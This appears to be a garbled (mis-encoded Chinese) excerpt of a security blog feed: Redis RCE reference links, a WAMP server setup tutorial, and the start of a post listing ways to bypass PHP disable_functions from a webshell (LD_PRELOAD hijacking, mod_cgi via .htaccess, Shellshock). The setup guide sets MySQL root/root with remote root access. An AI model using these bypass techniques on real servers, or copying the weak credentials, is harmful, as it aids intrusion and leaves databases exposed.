<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">Pavel Toporkovåˆ†äº«çš„rceæ–¹å¼</a></li>
<li><a href="https://422926799.github.io/posts/ac34060e.html" target="_blank" rel="noopener">redis-rceçš„åŸç†</a></li>
<li><a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">redis-RESP</a></li>
<li><a href="https://xz.aliyun.com/t/7974#toc-11" target="_blank" rel="noopener">æµ…æLinuxä¸‹Redisçš„æ”»å‡»é¢(ä¸€)</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»ºwampå’ŒåŸŸåæœåŠ¡</title>
    <url>/2020/07/12/wamp_dns/</url>
    <content><![CDATA[<hr>
<h2 id="æ­å»ºwampå’ŒåŸŸåæœåŠ¡"><a href="#æ­å»ºwampå’ŒåŸŸåæœåŠ¡" class="headerlink" title="æ­å»ºwampå’ŒåŸŸåæœåŠ¡"></a>æ­å»ºwampå’ŒåŸŸåæœåŠ¡</h2><ul>
<li>WAMPç¯å¢ƒ</li>
<li>å®‰è£…Apache</li>
<li>å®‰è£…PHP</li>
<li>MySQLå®‰è£…</li>
<li>æ­å»ºåŸŸå</li>
<li>æ­å»ºè™šæ‹Ÿä¸»æœº<ul>
<li>åŸºäºIPçš„è™šæ‹Ÿä¸»æœº</li>
<li>åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº</li>
<li>åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº</li>
<li>æ³¨æ„</li>
</ul>
</li>
</ul>
<h3 id="0X00-WAMPç¯å¢ƒ"><a href="#0X00-WAMPç¯å¢ƒ" class="headerlink" title="0X00 WAMPç¯å¢ƒ"></a>0X00 WAMPç¯å¢ƒ</h3><ul>
<li>ç¯å¢ƒæ­å»ºè·¯å¾„ä¸èƒ½ä¸ºä¸­æ–‡ï¼Œå¯ä»¥é›†ä¸­åœ¨ä¸€ä¸ªseverç›®å½•ä¸‹</li>
<li>Apacheï¼šhttpd-2.4.41-o111c-x64-vc15-r2<ul>
<li>2.4.41â€“ç‰ˆæœ¬å·</li>
<li>x64â€“å¯¹åº”ç³»ç»Ÿå¹³å°</li>
<li>vc15â€“ç¼–è¯‘å¹³å°</li>
</ul>
</li>
<li>PHPï¼šphp-7.4.3-Win32-vc15-x64<ul>
<li>x64â€“å¯¹åº”ç³»ç»Ÿå¹³å°</li>
<li>7.4.3â€“ç‰ˆæœ¬å·</li>
<li>vc15â€“ç¼–è¯‘å¹³å°</li>
</ul>
</li>
<li>MySQLï¼šmysql5.5<ul>
<li>5.5â€“ç‰ˆæœ¬å·</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/server%E7%9B%AE%E5%BD%95.png" alt="serverç›®å½•"></p>
<h3 id="0X01-å®‰è£…Apache"><a href="#0X01-å®‰è£…Apache" class="headerlink" title="0X01 å®‰è£…Apache"></a>0X01 å®‰è£…Apache</h3><ul>
<li>Apache httpdï¼š<a href="https://www.apachehaus.com/cgi-bin/download.plx" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx</a><ul>
<li>æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”çš„Apache httpdæœåŠ¡</li>
<li>â–² ä»Apacheå®˜ç½‘ä¸‹è½½ç›¸åº”çš„æºç ï¼Œç°åœ¨æ¯”è¾ƒéš¾ä»¥æ‰¾åˆ°msiå®‰è£…åŒ…</li>
</ul>
</li>
<li>å®‰è£…<ul>
<li>â–² ç›®å½•è·¯å¾„ä¸å¯ä¸ºä¸­æ–‡</li>
<li>å°†æ–‡ä»¶è§£å‹åˆ°æ–°å»ºçš„serverç›®å½•ï¼Œå‘½åä¸ºApache</li>
<li>æµ‹è¯•æœåŠ¡ï¼šcmd -&gt; httpd.exe -t<ul>
<li>æ–°è§£å‹çš„ApacheæœåŠ¡ä¼šæŠ¥é”™è¯¯ï¼Œéœ€è¦Define SRVROOTï¼Œæ›´æ”¹ä¸ºApacheçš„ç»å¯¹è·¯å¾„</li>
<li>æµ‹è¯•æˆåŠŸï¼šSyntax OK</li>
</ul>
</li>
<li>å®‰è£…ï¼šcmd -&gt; httpd.exe -K install<ul>
<li>è‹¥æ— æŠ¥é”™ä¿¡æ¯ï¼Œåˆ™å¯ä»¥åœ¨Apache Service Monitorå¯åŠ¨ApacheæœåŠ¡</li>
</ul>
</li>
<li>æŸ¥çœ‹ä½¿ç”¨çš„æ¨¡å—ï¼šcmd -&gt; httpd.exe -M<ul>
<li><static>ï¼šé™æ€åŠ è½½ï¼ŒApacheå¯åŠ¨å°±åŠ è½½å¥½ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨</li>
<li><shared>ï¼šåŠ¨æ€åŠ è½½ï¼Œåœ¨ä½¿ç”¨åˆ°çš„æ—¶å€™æ‰ä¼šåŠ è½½</li>
</ul>
</li>
</ul>
</li>
<li>ç›®å½•è¯´æ˜<ul>
<li>bin/cgi-binï¼šwindowsä¸‹çš„ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶</li>
<li>confï¼šé…ç½®æ–‡ä»¶ç›®å½•</li>
<li>htdocsï¼šApacheé»˜è®¤çš„ä¸»æœºåœ°å€ï¼ˆç½‘ç«™æ ¹ç›®å½•ï¼‰</li>
<li>modulesï¼šApacheçš„åŠŸèƒ½åŒ–æ¨¡å—</li>
</ul>
</li>
<li>é…ç½®ç«™ç‚¹<ul>
<li>â–² é…ç½®æ–‡ä»¶ï¼šhttpd.conf -&gt; è‡ªå®šä¹‰SRVROOT</li>
<li>ç½‘ç«™æ–‡ä»¶å¤¹æ‰€åœ¨ä½ç½®ï¼šDocumentRoot/ServerRoot â€œ${SRVROOT}/htdocsâ€</li>
<li>ä½¿ç”¨åå­—è®¿é—®ç½‘ç«™ï¼šServerName localhost</li>
<li>ç«¯å£ç›‘å¬ï¼šListen 80</li>
</ul>
</li>
<li>â­ æ¯æ¬¡åŠ¨åˆ°é…ç½®æ–‡ä»¶ï¼Œå¯é€šè¿‡httpd.exe -tå»æµ‹è¯•æ˜¯å¦é…ç½®ç¼–è¯‘é”™è¯¯</li>
<li>â–² å‡¡æ˜¯æ¶‰åŠåˆ°Apacheé…ç½®æ–‡ä»¶çš„ä¿®æ”¹ï¼Œéƒ½éœ€è¦é‡å¯Apacheæ‰èƒ½ç”Ÿæ•ˆ</li>
<li>â–² å®ç°DNSåŸŸåè§£æï¼šä¿®æ”¹hostsæ–‡ä»¶ -&gt; 127.0.0.1  localhost</li>
<li>â–² å¯åœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡çš„PATHä¸­åŠ è½½httpd.exeçš„è·¯å¾„</li>
<li>æµè§ˆå™¨è®¿é—®localhostï¼Œçœ‹æ˜¯å¦èƒ½æˆåŠŸè®¿é—®åˆ°</li>
</ul>
<p><img src="/images/php/php-notepad/Apache%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="Apacheå®‰è£…æˆåŠŸ"></p>
<h3 id="0X02-å®‰è£…PHP"><a href="#0X02-å®‰è£…PHP" class="headerlink" title="0X02 å®‰è£…PHP"></a>0X02 å®‰è£…PHP</h3><ul>
<li>PHPï¼š<a href="https://windows.php.net/download#php-7.4" target="_blank" rel="noopener">https://windows.php.net/download#php-7.4</a><ul>
<li>æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”çš„PHPæœåŠ¡</li>
<li>æ ¹æ®Apacheé€‰æ‹©å¯¹åº”çš„ç¼–è¯‘ç¯å¢ƒ</li>
<li>é€‰æ‹©Thread Safeçº¿ç¨‹å®‰å…¨çš„å½¢å¼</li>
</ul>
</li>
<li>å®‰è£…<ul>
<li>â–² ç›®å½•è·¯å¾„ä¸å¯ä¸ºä¸­æ–‡</li>
<li>å°†æ–‡ä»¶è§£å‹åˆ°æ–°å»ºçš„serverç›®å½•ï¼Œå‘½åä¸ºPHP7.4.3</li>
<li>å¯é€šè¿‡php.exeè¿è¡Œå‘½ä»¤æ¥æŒ‡å®šè¦è§£æçš„PHPè„šæœ¬ -&gt; php.exe  -f  PHPæ–‡ä»¶æ‰€åœ¨è·¯å¾„çš„index.phpæ–‡ä»¶ -&gt; hello world</li>
</ul>
</li>
<li>ç›®å½•è¯´æ˜<ul>
<li>extï¼šæ‰©å±•åŒ…-&gt;PHPå¾ˆå¤šåŠŸèƒ½æ˜¯é€šè¿‡åŠ è½½æ‰©å±•æ¥å®ç°</li>
<li>php7apache2_4.dllï¼šApacheæ”¯æŒåŒ…</li>
<li>php.exeï¼šPHPè§£é‡Šå™¨</li>
</ul>
</li>
<li>é…ç½®ApacheåŠ è½½PHPæ¨¡å—<ul>
<li>â–² é…ç½®Apacheæ–‡ä»¶ï¼šhttpd.conf</li>
<li>ApacheåŠ è½½PHPæ¨¡å—ï¼šåœ¨Apacheçš„ä¸»é…ç½®æ–‡ä»¶ä¸­åŠ è½½å¯¹åº”çš„PHPæä¾›çš„æ¨¡å—<ul>
<li>LoadModule php7_module PHPæ‰€æä¾›çš„æ¨¡å—é“¾æ¥æ‰€åœ¨è·¯å¾„</li>
</ul>
</li>
<li>Apacheåˆ†é…å·¥ä½œç»™PHPæ¨¡å—ï¼šå¦‚æœæ˜¯PHPä»£ç å°±äº¤ç»™PHPå¤„ç†â€“æ–‡ä»¶åç¼€åˆ¤æ–­<ul>
<li>AddType application/x-httpd-php .php</li>
</ul>
</li>
<li>å°†PHPçš„é…ç½®æ–‡ä»¶åŠ è½½åˆ°Apacheé…ç½®æ–‡ä»¶ä¸­<ul>
<li>PHPIniDir php.iniæ‰€åœ¨è·¯å¾„</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E9%85%8D%E7%BD%AEApache%E5%8A%A0%E8%BD%BDPHP%E6%A8%A1%E5%9D%97.png" alt="é…ç½®ApacheåŠ è½½PHPæ¨¡å—"></p>
<ul>
<li>é…ç½®æ–‡ä»¶<ul>
<li>php.iniæ–‡ä»¶é»˜è®¤æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ˜¯ä»¥developmentå­˜åœ¨ï¼Œå¤åˆ¶ä¸€ä»½ï¼Œä¿®æ”¹å‘½åä¸ºphp.ini</li>
</ul>
</li>
<li>æµ‹è¯•<ul>
<li>æ–°å»ºä¸€ä¸ªindex.phpæ–‡ä»¶</li>
<li>æµè§ˆå™¨è®¿é—®localhost/index.php</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/PHP%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="PHPå®‰è£…æˆåŠŸ"></p>
<h3 id="0X03-MySQLå®‰è£…"><a href="#0X03-MySQLå®‰è£…" class="headerlink" title="0X03 MySQLå®‰è£…"></a>0X03 MySQLå®‰è£…</h3><ul>
<li>MySQLï¼š<a href="https://www.mysql.com/downloads/" target="_blank" rel="noopener">https://www.mysql.com/downloads/</a><ul>
<li>æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”çš„MySQLæœåŠ¡</li>
<li>å®‰è£…mysqlä¸€èˆ¬å®‰è£…5.xç‰ˆæœ¬ï¼Œ7.xç‰ˆæœ¬ä¸ºä¸€å®šç¨‹åº¦çš„é˜‰å‰²ç‰ˆ</li>
</ul>
</li>
<li>å®‰è£…<ul>
<li>Customeï¼šè‡ªå®šä¹‰å®‰è£…ï¼ˆé€‰æ‹©å®‰è£…è·¯å¾„ï¼‰<ul>
<li>MySQL Server -&gt; server/mysql</li>
<li>Server data files -&gt; server/mysql/data</li>
</ul>
</li>
<li>Launch the MySQL Instance Configuration Wizardï¼šé…ç½®<ul>
<li>Please select a configuration -&gt; Detailed Configurationï¼šè¯¦ç»†é…ç½®</li>
<li>Please select a server type -&gt; Developer Machineï¼šå¼€å‘ç¯å¢ƒ</li>
<li>Please select the database usage -&gt; Multifunctional Databaseï¼šå¤šåŠŸèƒ½</li>
<li>Please set the approximate number of cocurrent connections to the server -&gt; Manual Setting(15):å¹¶å‘è®¾ç½®</li>
<li>Please set the networking options<ul>
<li>Enable TCP/IP Networking  -&gt; å…è®¸TCP/IPåè®®è®¿é—®<ul>
<li>Prot Number -&gt; 3306</li>
<li>Add firewall exception for this port -&gt; é˜²ç«å¢™é€šè¿‡</li>
</ul>
</li>
<li>Enable Strict Mode -&gt; ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼</li>
</ul>
</li>
<li>Please select the default set -&gt; Manual Selected Default Character Set / Collation:å­—ç¬¦é›†è®¾å®š -&gt; utf8</li>
<li>Please set the Windows options <ul>
<li>Install As Windows Serviceï¼šæœåŠ¡å®‰è£…<ul>
<li>Service Nameï¼šMySQL</li>
<li>Launch the MySQL Server automaticallyï¼šéšç³»ç»Ÿå¯åŠ¨</li>
</ul>
</li>
<li>Include Bin Directory in Windows PATHï¼šè®²MySQLåŠ åˆ°ç³»ç»Ÿè·¯å¾„</li>
</ul>
</li>
<li>Please set the security options<ul>
<li>Modify security settings<ul>
<li>New root password -&gt; root</li>
<li>Confirm -&gt; root</li>
<li>Enable root access from remote machinesï¼šå…è®¸è¿œç¨‹è®¿é—®</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/MySQL%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="MySQLå®‰è£…æˆåŠŸ"></p>
<ul>
<li>ç›®å½•è¯´æ˜<ul>
<li>binï¼šæ‰§è¡Œæ–‡ä»¶å¤¹<ul>
<li>mysql.exeï¼šè®¿é—®MySQLæœåŠ¡å™¨çš„å®¢æˆ·ç«¯</li>
<li>mysqld.exeï¼šMySQLæœåŠ¡</li>
<li>mysqldump.exeï¼šMySQLçš„å¤‡ä»½è½¯ä»¶å®¢æˆ·ç«¯</li>
</ul>
</li>
<li>dataï¼šæ•°æ®å­˜å‚¨æ–‡ä»¶å¤¹</li>
<li>libï¼šæ ¸å¿ƒæ–‡ä»¶å¤¹</li>
<li>my.iniï¼šé…ç½®æ–‡ä»¶</li>
</ul>
</li>
<li>æµ‹è¯•mysqlæœåŠ¡<ul>
<li>cmd -&gt; mysql -u root -p</li>
<li>å‚æ•°<ul>
<li>-hï¼šä¸»æœºåœ°å€</li>
<li>-pï¼šç«¯å£</li>
<li>-uï¼šç”¨æˆ·å</li>
<li>-pï¼šå¯†ç </li>
</ul>
</li>
</ul>
</li>
<li>PHPè¿æ¥MySQLæ•°æ®åº“<ul>
<li>â–² é…ç½®phpæ–‡ä»¶ï¼šphp.ini</li>
<li>PHPçš„æ‰©å±•éƒ½æ˜¯åœ¨extæ–‡ä»¶å¤¹ä¸­ï¼Œéœ€è¦åˆ¶å®šæ‰©å±•æ‰€åœ¨è·¯å¾„ï¼šextension_dir=â€/server/php7.4.3/extâ€</li>
<li>å¼€å¯sqliæ‰©å±•ï¼šextension=mysqli</li>
<li>å¼€å¯pdo_mysqlæ‰©å±•ï¼šextension=pdo_mysql</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="PHPè¿æ¥MySQLæ•°æ®åº“"></p>
<ul>
<li>æµ‹è¯•PHPè¿æ¥mysql<ul>
<li>æ–°å»ºä¸€ä¸ªtestmysql.phpæ–‡ä»¶</li>
<li>æµè§ˆå™¨è®¿é—®localhost/testmysql.pyï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°OKï¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">    if(!$link) echo &quot;Error !&quot;;</span><br><span class="line">    else echo &quot;Ok!&quot;;</span><br><span class="line">    mysqli_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/phpinfo--mysqli.png" alt="phpinfo--mysqli"></p>
<p><img src="/images/php/php-notepad/phpinfo--pdo_mysql.png" alt="phpinfo--pdo_mysql"></p>
<h3 id="0X04-æ­å»ºåŸŸå"><a href="#0X04-æ­å»ºåŸŸå" class="headerlink" title="0X04 æ­å»ºåŸŸå"></a>0X04 æ­å»ºåŸŸå</h3><ul>
<li>ä¿®æ”¹hostsæ–‡ä»¶ -&gt; 127.0.0.1  localhost</li>
</ul>
<h3 id="0X05-æ­å»ºè™šæ‹Ÿä¸»æœº"><a href="#0X05-æ­å»ºè™šæ‹Ÿä¸»æœº" class="headerlink" title="0X05 æ­å»ºè™šæ‹Ÿä¸»æœº"></a>0X05 æ­å»ºè™šæ‹Ÿä¸»æœº</h3><ul>
<li>å®˜æ–¹è§£é‡Šæ–‡æ¡£ï¼š<a href="http://httpd.apache.org/docs/current/vhosts/" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/vhosts/</a></li>
<li>é…ç½®è™šæ‹Ÿä¸»æœºæ–¹å¼<ul>
<li>åŸºäºIP</li>
<li>åŸºäºä¸»æœºå</li>
<li>åŸºäºç«¯å£</li>
</ul>
</li>
<li>å®éªŒç¯å¢ƒ<ul>
<li>åœ¨Apacheä¸‹çš„htdocsç›®å½•ä¸­ï¼Œæ–°å»ºä¸¤ä¸ªç›®å½•ï¼Œtest1å’Œtest2<ul>
<li>test1ç›®å½•ä¸‹1.phpï¼ˆ<?php phpinfo(); ?>ï¼‰</li>
<li>test2ç›®å½•ä¸‹2.phpï¼ˆ<?php echo "OKKKK" ?>ï¼‰</li>
<li>â–² 2020.03.05åœ¨æŸ¥è¯¢èµ„æ–™çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰é‡åˆ°testç›®å½•å¯ä»¥å»ºç«‹åœ¨htdocsçš„æƒ…å†µï¼Œä½†å®æ“å‘ç°ä¸è¡Œ</li>
</ul>
</li>
<li>æœ¬åœ°æ¨¡æ‹Ÿå¤–ç½‘åŸŸåï¼Œåœ¨hostsæ–‡ä»¶ä¸­é…ç½®ä¸¤ä¸ªæµ‹è¯•åŸŸå<ul>
<li>127.0.0.1 <a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a></li>
<li>127.0.0.1 <a href="http://www.test2mzt.com" target="_blank" rel="noopener">www.test2mzt.com</a></li>
</ul>
</li>
<li>ä¿®æ”¹é…ç½®ï¼ˆApache24\conf\httpd.confï¼‰<ul>
<li>#Virtual hosts -&gt; Include conf/extra/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAhosts%E6%96%87%E4%BB%B6%E8%AE%BE%E7%BD%AE.png" alt="è™šæ‹Ÿä¸»æœºhostsæ–‡ä»¶è®¾ç½®"></p>
<h5 id="åŸºäºIPçš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºIPçš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºIPçš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºIPçš„è™šæ‹Ÿä¸»æœº</h5><ul>
<li>åŸºäºIPï¼Œä¸€å°æœåŠ¡å™¨æœ‰å¤šä¸ªç½‘å¡ï¼Œæ¯ä¸ªIPç»‘å®šä¸€ä¸ªç«™ç‚¹çš„æ–¹å¼</li>
<li>â–² åŸºäºIPçš„æ–¹å¼ï¼Œå†™åœ¨VirtualHostçš„IPåœ°å€éœ€è¦å¯è¢«è·¯ç”±</li>
<li>â–² åœ¨ä¸‹å›¾ï¼Œæœ‰å¤šç§è®¿é—®æ–¹å¼è®¿é—®test2ä¸‹çš„2.php<ul>
<li>127.0.0.2:80/2.php</li>
<li><a href="http://www.test2mzt.com:80/2.php" target="_blank" rel="noopener">www.test2mzt.com:80/2.php</a></li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8EIP%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="åŸºäºIPçš„è™šæ‹Ÿä¸»æœº"></p>
<h5 id="åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº</h5><ul>
<li>ä¿®æ”¹é…ç½®æ–‡ä»¶å°†åŸæ¥çš„ï¼šListen 80æ”¹ä¸ºListen 80 Listen 88</li>
<li>â–² åŸºäºç«¯å£çš„æ–¹å¼ï¼Œéœ€è¦åœ¨httpd.confçš„é…ç½®æ–‡ä»¶ä¸­å¢åŠ ç›‘å¬ç«¯å£</li>
<li>â–² åœ¨ä¸‹å›¾ï¼Œæœ‰å¤šç§è®¿é—®æ–¹å¼è®¿é—®test2ä¸‹çš„2.php<ul>
<li>127.0.0.1:88/2.php</li>
<li><a href="http://www.test2mzt.com:88/2.php" target="_blank" rel="noopener">www.test2mzt.com:88/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº"></p>
<h5 id="åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº</h5><ul>
<li>åŸºäºä¸»æœºåä¹Ÿå°±æ˜¯åŸºäºåŸŸåæ–¹å¼è®¿é—®ï¼Œæ¯ä¸ªIPå¤šä¸ªç«™ç‚¹</li>
<li>â–² åŸºäºåŸŸåçš„æ–¹å¼ï¼Œéœ€è¦åœ¨hostsæ–‡ä»¶ä¸­æŒ‡å®šåŸŸå</li>
<li>â–² åœ¨ä¸‹å›¾ï¼Œæœ‰å¤šç§è®¿é—®æ–¹å¼è®¿é—®test2ä¸‹çš„2.php<ul>
<li>127.0.0.1/2.php</li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="åŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœº"></p>
<h5 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h5><ul>
<li><Directory>ç›®å½•æŠ¥é”™<ul>
<li>â–² 2020.03.05 Apacheå¯åŠ¨æŠ¥Invalid command â€˜orderâ€™, perhaps misspelled or defined by a module not includedçš„é”™è¯¯<ul>
<li>Apache2.4ä»¥ä¸Šï¼Œåšäº†ä¿®æ”¹</li>
<li>åœ¨LoadMoudleä¸­ï¼Œéœ€è¦é€šè¿‡access_compat_module modules/mod_access_compat.soå’Œactions_module modules/mod_actions.soæ¨¡å—ï¼Œæ‰èƒ½ä½¿ç”¨â€Orderã€Denyã€Allowâ€å†™é…ç½®æ–‡ä»¶</li>
<li>è‹¥ä¸é€šè¿‡access_compat_module modules/mod_access_compat.soæ›´æ”¹ï¼Œå¯ä»¥ä½¿ç”¨Apache Requireå‘½ä»¤</li>
</ul>
</li>
</ul>
</li>
<li>éœ€è¦ç»™å½“å‰è®¾å®šçš„ç«™ç‚¹ï¼ˆç›®å½•ï¼‰è®¿é—®æƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Directory &apos;ç«™ç‚¹ç›®å½•&apos;&gt;</span><br><span class="line">    #è®¾å®šæ–¹å¼ï¼šä»£è¡¨åŒ¹é…æƒé™çš„é¡ºåº</span><br><span class="line">    Order Deny,Allow    //æ²¡æœ‰é¡ºåºå…³ç³»ï¼šå®é™…é¡ºåºæœ‰æ„ä¹‰</span><br><span class="line">    #é™å®šèŒƒå›´ï¼šæŒ‰ç…§é¡ºåºæ‰§è¡Œ</span><br><span class="line">    Deny from æŒ‡å®šçš„èŒƒå›´</span><br><span class="line">    Allow from æŒ‡å®šèŒƒå›´/all</span><br><span class="line"></span><br><span class="line">    #åˆ—è¡¨æ˜¾ç¤ºï¼ˆè‹¥æ— æŒ‡å®šå…·ä½“è®¿é—®æ–‡ä»¶æˆ–è®¿é—®æ–‡ä»¶å¤¹ï¼‰</span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #æŒ‡å®šé»˜è®¤è®¿é—®æ–‡ä»¶</span><br><span class="line">    Directory Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #æŒ‡å®šé»˜è®¤è®¿é—®æ–‡ä»¶</span><br><span class="line">    DirectoryIndex index.html index.php</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² ä¸€æ—¦å¯ç”¨è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆé»˜è®¤çš„ä¸»æœºåœ°å€localhostå°±ä¸å†ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦ç”Ÿæ•ˆå°±è¦ä¸ºlocalhostå¢åŠ å•ç‹¬çš„è™šæ‹Ÿä¸»æœº</li>
<li>â–² å¦‚æœè¯´ç½‘ç«™ä¸­æ•´ä¸ªç½‘ç«™æ ¹ç›®å½•å…è®¸è®¿é—®ï¼Œä½†æ˜¯å…¶ä¸­è¿˜æœ‰å…¶ä»–æ–‡ä»¶å¤¹ä¸å…è®¸è®¿é—®ï¼šå¯ä»¥å¢åŠ å¤šä¸ªDirectoryæ ‡ç­¾ï¼Œé’ˆå¯¹ä¸åŒçš„æ–‡ä»¶å¤¹</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>WebShellä¸‹ç»•è¿‡disable_function</title>
    <url>/2020/08/30/bypass_disable_function/</url>
    <content><![CDATA[<h2 id="WebShellä¸‹ç»•è¿‡disable-function"><a href="#WebShellä¸‹ç»•è¿‡disable-function" class="headerlink" title="WebShellä¸‹ç»•è¿‡disable_function"></a>WebShellä¸‹ç»•è¿‡disable_function</h2><h3 id="0X00-Webshellæ¦‚è¦"><a href="#0X00-Webshellæ¦‚è¦" class="headerlink" title="0X00 Webshellæ¦‚è¦"></a>0X00 Webshellæ¦‚è¦</h3><h5 id="WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› "><a href="#WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› " class="headerlink" title="WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› "></a>WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› </h5><ul>
<li>php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°</li>
<li>web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­  -&gt;  å¯æ‰§è¡Œå°‘é‡ç³»ç»Ÿå‘½ä»¤</li>
<li>WAF æ‹¦åŠ«  -&gt;  å¯æ‰§è¡Œå°‘äº†ç³»ç»Ÿå‘½ä»¤</li>
</ul>
<h5 id="ç»•è¿‡disable-functionæ–¹æ³•"><a href="#ç»•è¿‡disable-functionæ–¹æ³•" class="headerlink" title="ç»•è¿‡disable_functionæ–¹æ³•"></a>ç»•è¿‡disable_functionæ–¹æ³•</h5><ul>
<li>æ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´</li>
<li>å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•</li>
<li>mod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶</li>
<li>åˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœ</li>
</ul>
